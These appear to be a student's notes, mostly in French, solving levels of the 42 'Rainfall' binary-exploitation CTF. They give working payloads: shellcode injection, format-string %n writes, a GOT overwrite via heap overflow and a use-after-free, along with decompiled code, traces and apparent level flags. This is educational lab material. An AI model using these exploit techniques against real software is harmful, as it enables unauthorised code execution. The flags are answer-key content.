# Projet CTF de 42 Rainfall


rain 
level2:
fflush(stdout) => permet de ne pas stocker en memoire ce qui a dans la fonction gets
Donc unaff_retaddr est overwritting et est checks
Mais il y a strop donc local va être stocke dans la heap et la on peut déclencher notre shellcode
https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf
(python -c 'print "\x90" * 39 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x20\xa0\x04\x08" * 5'; cat) | ./level2
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

Level3:
Just change the value of m to 0x40
Gdb level3
Variable m is in 0x804988c
It s format string vulnerability a cause de printf(buf)
https://null-byte.wonderhowto.com/how-to/exploit-development-write-specific-values-memory-with-format-string-exploitation-0182112/
On trouve la variable m: p &m
(python -c 'print "\x8c\x98\04\x08" + "%x %x %46x %n"')
%n => écrit le nbr de caractere et le stock en memoire (ici a le memoire de m)
On doit avoir m == 64 donc on rajoute 44 caractère a un %x
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

Level4:
Ca a lair d être la meme sauf qu il faut aller plus loin dans les caractères
   0x08048492 <+59>:	cmp    $0x1025544,%eax
0x8049810 m se trouve a cette adresse
(python -c 'print "\x10\x98\x04\x08" + " %x " * 10 + " %16930040x " + " %n"') | ./level4
J arrive a bien changer mais rien n apparait 
Peut être changer aussi la valeur dans system ?
0x8048590 memoire de ce qui aura dans system

Level7:
For example malloc() will call abort() if its internal structures are damaged by a heap overflow.
0x80484f4 faut call this function
0x8049960 c est le mdp
Ce que j ai compris:
Si j overflow sur le premier argv ca va écrire sur le deuxième argv donc quand il va copier le deuxième strcpy il ne trouve pas le deuxième eax donc segfault
Mais pourquoi 0xb7eb8fd2 ?
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAAAA")  = 0x0804a018
strcpy(0x41414141, "BBBBBBBBBB" <unfinished ...>
Vizu du ltrace on peut voir que le deuxième strcpy essaye de mettre la valeur "BBBBBBBBBB" dans “0x41414141” du coup essayons d émettre l adresse de m 0x080484f4 dans l adresse qui call put 0x8048400
Disas  0x8048400:
0x08048400 <+0>:	jmp    *0x8049928
Donc on prends 0x8049928 a la place de 0x8048400 parce que \x00
./level7 $(python -c 'print "\x41" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

Level8:
L attack a utiliser est use after free
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[5]; // [esp+20h] [ebp-88h] BYREF
  char v5[2]; // [esp+25h] [ebp-83h] BYREF
  char v6[129]; // [esp+27h] [ebp-81h] BYREF

  while ( 1 )
  {
    printf("%p, %p \n", auth, (const void *)service);
    if ( !fgets(s, 128, stdin) )
      break;
    if ( !memcmp(s, "auth ", 5u) )
    {
      auth = (char *)malloc(4u);
      *(_DWORD *)auth = 0;
      if ( strlen(v5) <= 0x1E )
        strcpy(auth, v5);
    }
    if ( !memcmp(s, "reset", 5u) )
      free(auth);
    if ( !memcmp(s, "service", 6u) )
      service = (int)strdup(v6);
    if ( !memcmp(s, "login", 5u) )
    {
      if ( *((_DWORD *)auth + 8) )
        system("/bin/sh");
      else
        fwrite("Password:\n", 1u, 0xAu, stdout);
    }
  }
  return 0;
}
On peut voir dans le code que après le free auth n est pas init a NULL. On sait que free libere l espace mais auth pointe tjr a son adresse. Et que le prochain malloc prendra son chunk memoire. On peut voir dans le code que c est en tapant service qu on a le prochaine malloc donc si on tape service 3 fois on va finir par remplir la partie memoire *((_DWORD *)auth + 8) et elle ne sera donc plus a 0.
(nil), (nil)
auth
0x804a008, (nil)
reset
0x804a008, (nil)
service
0x804a008, 0x804a008
service
0x804a008, 0x804a018
login
Password:
0x804a008, 0x804a018
service
0x804a008, 0x804a028
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a


Level9:
run $(python -c 'print "\x43" * 109') segmentation fault different salon le characters
Si c est + que 110 alors 0x08048682
memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 200)
        return **eax_1(eax_1, eax);
Le return a la fin est le resultat de de la fonction operation +
Trouver un moyen de rediriger le pointeur dans un shell code using memcpy ?
On peut rediriger l adresse avec un overflow sur le memcpy qui va du coup overflow sur la prochaine variable. Du coup mettre l adresse d un shell code sur la prochaine variable ? Oui car c est un pointeur sur un pointeur donc:
$(python -c 'print "\x90\x90\x90\x90" + "\x24\xa0\x04\x08" + "\x90" * 17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x43" * 58 + "\x10\xa0\x04\x08"')
This works because it’s calling 0x0804a010 who is calling 0x0804a024 who has the shell code.
